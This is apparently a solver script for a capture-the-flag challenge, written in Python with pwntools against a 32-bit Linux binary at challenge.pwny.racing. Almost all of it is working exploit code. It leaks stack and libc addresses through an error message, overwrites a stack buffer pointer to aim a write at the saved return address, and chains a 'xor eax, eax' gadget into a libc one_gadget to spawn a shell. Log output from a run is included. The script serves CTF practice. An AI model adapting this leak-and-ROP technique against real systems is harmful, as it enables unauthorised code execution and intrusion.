#!/usr/bin/env python
import os, sys, pwn, subprocess

pwn.context(os = 'linux', arch = 'i386')
log = lambda m : pwn.log.info(m)

BINARY_PATH = "./chall"
BINARY = pwn.ELF(BINARY_PATH)

ARGS = [arg.lower() for arg in sys.argv]
HOST = "challenge.pwny.racing"
PORT = 11539
ONLINE = "online" in ARGS
GDB_DEBUG = "gdb" in ARGS
GDB_BEGIN = "gdb-begin" in ARGS
GDB_SCRIPT = """
continue
"""

# NOTES:
# It's not pretty, but it worked.
# Comments + slight modifications added post-solve.
# export PROG='/bin/ls' before running to mimic server environment.

if not ONLINE:
    LIBC_PATH = "/lib/i386-linux-gnu/libc.so.6"

    if GDB_BEGIN:
        log("Starting with GDB BEGIN")
        c = pwn.gdb.debug(BINARY_PATH, GDB_SCRIPT)
    else:
        log("Starting \"{}\"".format(BINARY_PATH))
        c = pwn.process(BINARY_PATH)
        if GDB_DEBUG: 
            log("Attaching GDB")
            pwn.gdb.attach(c, GDB_SCRIPT)
else:
    LIBC_PATH = "./libc-2.27.so"
    c = pwn.connect(HOST, PORT)

LIBC = pwn.ELF(LIBC_PATH)


# Really gross way of parsing out the leaked data...
def grossLeak(leak, payload):
    try:
        # Get what we're interested in.
        leak = "'$'".join(leak.split("': No such file")[0].split(payload[-4:])[1:]).split("'$'")
        # Remove empty elements.
        leak = [ l for l in leak if len(l) > 0 ]
        # Converting from "\\xx\\xx\\xx" ascrii representation to raw bytes.
        for i, x in enumerate(leak):
            if x[0] == '\\':
                try: leak[i] = ''.join([ "\\{}".format(p).decode("string_escape") for p in x.split('\\') if p != '' ])
                except: leak[i] = x
        leak = ''.join(leak).replace("''", "")
    except Exception as e:
        print("Unlucky", e)
        exit(0)
    # Finally, unpack raw bytes.
    return pwn.u32(leak.ljust(4, '\x00')[:4])


# Adjust if needed. I was having buffering issues.
def wait():
    c.recv()
    c.clean()


# How many bytes until we overwrite our own stack buffer ptr.
STACK_BUFF_PTR_OFFSET = 56

# Stage 1 - Leaks
# Leak this to progress futher with our leak and not destroy the buff ptr.

payload = "A"*STACK_BUFF_PTR_OFFSET
c.send(payload)
c.recvuntil("cannot")

leak = c.recvuntil("':")
leakStack = grossLeak(leak, payload)
# Calculate address of saved PC for the current stackframe.
retStack = leakStack - 0x14

pwn.log.success("Stack Leak: " + hex(leakStack))
pwn.log.success("Addr of Ret: " + hex(retStack))
wait()

# Libc __start_main leak.
payload = "A"*STACK_BUFF_PTR_OFFSET
payload += pwn.p32(leakStack)
payload += "BBBB"*8
c.send(payload)
c.recvuntil("")
leak = c.recvuntil("':")

# Calculate required addresses.
leakLibc = grossLeak(leak, payload)
pwn.log.success("Libc __libc_start_main Leak: " + hex(leakLibc))

# The leak is somewhere in __libc_start_main. Not too sure where.
# Removing the last 3 nibbles seems okay...
libcBase = (leakLibc - LIBC.symbols['__libc_start_main']) & 0xffffff00
pwn.log.success("Libc base addr: " + hex(libcBase))
wait()


# Replace the stack buffer pointer with a pointer to the ret address.
# Note we're using the libc leak (__libc_start_main) as our "junk"
# just incase it's loaded into ESI which is required by most one gadgets.
#
# payload = "A"*STACK_BUFF_PTR_OFFSET   # This also seems to work but I've had errors before.
payload = pwn.p32(leakLibc)*(STACK_BUFF_PTR_OFFSET/4)
payload += pwn.p32(retStack)
c.sendline(payload)
wait()


# Everything from here on can be hardcoded - but I was trying this on multiple VMs to find edge cases
# and attempt to improve reliabiltiy.
# Call one_gadget on the libc we're using and get the eax == NULL one.
p = subprocess.Popen(['one_gadget', '-f', LIBC_PATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
for _ in p.communicate()[0].split('\n\n'):
    if "eax == NULL" in _: p = _; break

if type(p) != str: pwn.log.error("Failed to find oneshot gadget.");  exit(0)


# Search for oneshot gadget.
# We're looking for a specific one, however this can be changed...
try: p = int(p.strip().split(' ')[0].strip(), 16)
except: pwn.log.error("This libc doesn't have a oneshot for xor eax, eax."); exit(0)    
oneshot = libcBase + p
pwn.log.success("Addr of oneshot: " + hex(oneshot))


# Search for xor eax, eax and use the middle most gadget (just a guess, but 
# most likely in the .text section...).
gadgetOffset = list(LIBC.search("\x31\xc0\xc3")) # xor eax, eax; ret;
xor_eax_eax = libcBase + gadgetOffset[len(gadgetOffset)/2]
pwn.log.success("Addr of xor eax, eax: " + hex(xor_eax_eax))


# Stage 2
# Rop and pop. The next write will smash the return address on the stack.
payload = pwn.p32(xor_eax_eax) # xor eax, eax
payload += pwn.p32(oneshot)    # Oneshot gadget that requires eax = NULL
c.sendline(payload)

# Shell?
c.interactive()

"""
[+] Stack Leak: 0xffb4a290
[+] Addr of Ret: 0xffb4a27c
[+] Libc __libc_start_main Leak: 0xf7d83e81
[+] Libc base addr: 0xf7d6b000
[+] Addr of oneshot: 0xf7dd2a7f
[+] Addr of xor eax, eax: 0xf7e70b60
[*] Switching to interactive mode
"""
